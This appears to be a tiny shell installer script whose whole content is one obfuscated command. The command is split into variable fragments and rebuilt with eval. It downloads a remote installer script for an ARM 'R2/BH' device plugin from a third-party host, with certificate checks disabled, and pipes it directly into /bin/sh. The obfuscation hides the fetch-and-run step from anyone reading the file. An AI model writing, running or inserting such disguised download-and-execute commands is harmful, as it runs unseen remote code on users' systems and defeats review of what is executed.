z="
";Jz='p://';Sz='H/ar';Kz='plug';Wz='alle';Qz='gin/';Uz='-r2-';Yz=' -O ';Xz='r.sh';az='/bin';Lz='in.g';Gz='ific';Vz='inst';Zz='- | ';Ez='eck-';Dz='o-ch';Tz='m-bh';Fz='cert';Oz='.com';Az='wget';bz='/sh';Bz=' -q ';Hz='ate"';Rz='R2/B';Cz='"--n';Nz='plus';Iz=' htt';Mz='osat';Pz='/Plu';
eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Xz$Yz$Zz$az$bz"